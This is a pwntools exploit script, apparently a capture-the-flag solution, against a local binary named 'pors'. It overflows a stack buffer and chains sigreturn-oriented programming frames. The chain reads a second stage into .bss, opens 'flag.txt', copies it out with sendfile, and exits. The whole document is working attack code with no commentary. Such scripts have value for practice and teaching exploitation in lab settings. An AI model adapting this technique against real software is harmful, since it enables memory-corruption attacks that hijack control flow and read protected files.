from pwn import *
context(log_level='debug', arch='amd64', os='linux',
        terminal=['tmux', 'splitw', '-h'])

io = process("./pors")
elf = ELF("./pors")

syscall = 0x4010b0
bss_addr = 0x404400-0x8
flag_addr = 0x404400-0x8
pop_rdi = 0x4012ec


trigger = p64(pop_rdi)+p64(0xf)+p64(syscall)


# read(0,bss,0x800)
sigframe = SigreturnFrame()
sigframe.rdi = constants.SYS_read
sigframe.rsi = 0
sigframe.rdx = bss_addr
sigframe.rcx = 0x800
sigframe.rsp = 0x404408
sigframe.rip = syscall

payload = cyclic(0x28)+trigger+bytes(sigframe)
io.send(payload)

sleep(1)

sigframe_opa = SigreturnFrame()
sigframe_opa.rdi = constants.SYS_openat
sigframe_opa.rsi = 0xffffff9c
sigframe_opa.rdx = flag_addr
sigframe_opa.rcx = 0
sigframe_opa.rsp = 0x404518
sigframe_opa.rip = syscall

payload = b"flag.txt"+p64(0)+trigger+bytes(sigframe_opa)

sigframe_sdf = SigreturnFrame()
sigframe_sdf.rdi = constants.SYS_sendfile
sigframe_sdf.rsi = 2
sigframe_sdf.rdx = 3
sigframe_sdf.rcx = 0
sigframe_sdf.r8 = 0x400
sigframe_sdf.rsp = 0x404628
sigframe_sdf.rip = syscall

payload += trigger+bytes(sigframe_sdf)

sigframe_ex = SigreturnFrame()
sigframe_ex.rdi = constants.SYS_exit
sigframe_ex.rsi = 0
sigframe_ex.rsp = 0x404628
sigframe_ex.rip = syscall

payload += trigger+bytes(sigframe_ex)
io.send(payload)

io.interactive()
